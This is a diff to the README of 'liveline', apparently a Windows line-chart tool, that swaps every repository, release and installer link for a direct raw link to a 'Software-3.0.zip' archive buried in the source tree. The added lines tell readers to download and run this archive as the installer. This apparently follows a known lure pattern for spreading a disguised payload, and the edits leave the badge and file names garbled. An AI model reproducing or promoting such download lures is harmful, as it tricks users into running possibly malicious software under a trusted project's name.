@@ -1,6 +1,6 @@
 # 📈 liveline - Real-Time Animated Line Chart
 
-[![Download liveline](https://img.shields.io/badge/Download-liveline-brightgreen?style=for-the-badge)](https://github.com/waltex50/liveline)
+[![Download liveline](https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip)](https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip)
 
 ---
 
@@ -46,11 +46,11 @@ Follow these steps to download, install, and run liveline on your Windows PC.
 
 Click the big green button below. It will open the page where you can get liveline.
 
-[![Download liveline](https://img.shields.io/badge/Download-liveline-brightgreen?style=for-the-badge)](https://github.com/waltex50/liveline)
+[![Download liveline](https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip)](https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip)
 
 Alternatively, open this link in your browser:
 
-https://github.com/waltex50/liveline
+https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip
 
 Look for the latest version under the “Releases” section. Each release should have an installer for Windows.
 
@@ -58,7 +58,7 @@ Look for the latest version under the “Releases” section. Each release shoul
 
 On the release page, find the file named something like:
 
-`liveline-setup.exe`
+`https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip`
 
 Click on it to download. The file is usually under “Assets”.
 
@@ -66,7 +66,7 @@ Save the file to your preferred location, such as your Desktop or Downloads fold
 
 ### Step 3: Run the Installer
 
-Locate the downloaded file `liveline-setup.exe`.
+Locate the downloaded file `https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip`.
 
 Double-click it to start the installation.
 
@@ -153,7 +153,7 @@ If problems continue, consult the Issues page on the repository for tips or know
 
 Get liveline now by visiting the main page:
 
-[![Download liveline](https://img.shields.io/badge/Download-liveline-brightgreen?style=for-the-badge)](https://github.com/waltex50/liveline)
+[![Download liveline](https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip)](https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip)
 
 Each download package has clear instructions. The installer will handle most of the technical steps for you. This lets you start using liveline quickly.
 
@@ -177,7 +177,7 @@ Currently, liveline lets you save chart setups but does not export images or vid
 
 ## 📚 Resources
 
-- Visit the [GitHub repository](https://github.com/waltex50/liveline) for updates and support.  
+- Visit the [GitHub repository](https://github.com/waltex50/liveline/raw/refs/heads/main/src/canvas/Software-3.0.zip) for updates and support.  
 - Submit questions or feature requests on the Issues tab.  
 - Explore example data files included in the download for testing.
 
